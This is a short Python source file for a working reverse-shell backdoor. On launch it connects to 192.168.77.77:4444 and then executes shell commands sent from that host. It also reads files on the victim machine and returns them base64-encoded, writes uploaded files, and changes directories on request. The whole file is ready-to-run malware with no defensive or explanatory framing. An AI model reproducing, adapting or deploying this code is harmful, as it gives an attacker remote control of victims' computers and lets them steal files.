import socket
import subprocess, json
import locale
import os
import base64
#import sys
#import importlib

#print(locale.getdefaultredencoding())

class BackDoor():
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))    
    
    def reliable_send(self, data):
        print(type(data))
        json_data = json.dumps(data, ensure_ascii=False)
        #print(json_data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                #print(json_data)
                return json.loads(json_data)
            except:
                continue
        """
        json_data = self.connection.recv(1024)
        return json.loads(json_data)
        """

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True).decode("cp866")
    
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def read_file(self, path):
        with open(path, "rb") as file: 
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(bytes(content)))
            return "[+] Upload successful!"

    def run(self):
        while True:
            command = self.reliable_receive()
            
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    command_result = list(command_result)
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
                    #print(command_result)
            except Exception:
                command_result = "[-] Attacked target error"
                
            self.reliable_send(command_result)
backdoor = BackDoor("192.168.77.77", 4444)
backdoor.run()

